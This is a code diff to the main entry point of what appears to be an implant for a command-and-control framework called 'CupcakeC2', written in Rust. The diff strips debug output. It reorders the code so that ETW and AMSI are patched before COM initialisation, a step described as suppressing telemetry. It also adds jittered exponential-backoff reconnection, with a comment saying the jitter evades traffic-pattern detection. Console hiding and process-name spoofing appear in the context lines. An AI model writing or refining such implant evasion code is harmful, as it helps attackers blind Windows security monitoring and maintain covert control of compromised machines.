@@ -68,28 +68,11 @@ fn main() {
 
         // 🚀 Initialize env_logger to capture log::* output
         env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();
-
-        // 🛡️ Direct print check (Independent of logger)
-        println!("========================================");
-        println!("[!] CupcakeC2 Runtime Bootstrap Started");
-        println!("[+] Logging: ENABLED");
-        println!("[+] Architecture: {}", std::env::consts::ARCH);
-        if let Ok(output) = std::process::Command::new("cmd").args(&["/C", "ver"]).output() {
-            println!("[+] OS Version: {}", String::from_utf8_lossy(&output.stdout).trim());
-        }
-        println!("[+] RUST_LOG: {:?}", std::env::var("RUST_LOG").unwrap_or_default());
-        println!("========================================\n");
-        use std::io::Write;
-        let _ = std::io::stdout().flush();
     }
 
     // 💥 Global Panic Hook
     std::panic::set_hook(Box::new(|info| {
         log::error!("PANIC OCCURRED: {:?}", info);
-        eprintln!("========================================");
-        eprintln!("CRITICAL ERROR (PANIC):");
-        eprintln!("{:?}", info);
-        eprintln!("========================================");
     }));
 
     // Seed PRNG
@@ -98,12 +81,6 @@ fn main() {
         Err(_) => 0x1337BEEF1337BEEF_u64,
     };
     cupcake_core::utils::seed_rng(seed);
-    
-    // 🛡️ [Diagnostic] COM Initialization for PTY support
-    #[cfg(target_os = "windows")]
-    unsafe {
-        CoInitializeEx(std::ptr::null_mut(), COINIT_MULTITHREADED);
-    }
 
     // 3. [Debug] DON'T Hide Console if logging is active
     if !logging_enabled {
@@ -112,11 +89,17 @@ fn main() {
         log::info!("Stealth: hide_console() skipped due to active logging");
     }
 
-    // 4. [Anti-Analysis] Patch ETW and AMSI (Windows only)
+    // 4. [Anti-Analysis] Patch ETW and AMSI BEFORE any COM/API calls
     #[cfg(target_os = "windows")]
     {
         stealth::patch_etw();
         stealth::patch_amsi();
+    }
+
+    // 5. COM Initialization for PTY support (AFTER ETW patch to suppress telemetry)
+    #[cfg(target_os = "windows")]
+    unsafe {
+        CoInitializeEx(std::ptr::null_mut(), COINIT_MULTITHREADED);
     }
 
     // 9. Backgrounding and Name Spoofing (Linux)
@@ -300,12 +283,21 @@ async fn run_tcp_mode() -> Result<()> {
              return Err(e);
          }
      };
+
+    // 使用指数退避重连策略（与 WS 模式一致）
+    let mut backoff = cupcake_core::ExponentialBackoff::new();
     
     loop {
         if let Err(_) = transport.connect().await {
-            tokio::time::sleep(tokio::time::Duration::from_secs(15)).await;
+            let delay = backoff.next_delay();
+            // 添加抖动避免流量模式识别
+            let jitter_ms = cupcake_core::utils::random_range(0, 3000) as u64;
+            tokio::time::sleep(delay + tokio::time::Duration::from_millis(jitter_ms)).await;
             continue;
         }
+        
+        // 连接成功：重置退避
+        backoff.reset();
         
         let handler = MessageHandler::new(transport);
         
@@ -321,7 +313,8 @@ async fn run_tcp_mode() -> Result<()> {
                             break;
                         }
                         Err(_) => {
-                            tokio::time::sleep(tokio::time::Duration::from_secs(30)).await;
+                            let delay = backoff.next_delay();
+                            tokio::time::sleep(delay).await;
                         }
                     }
                 }
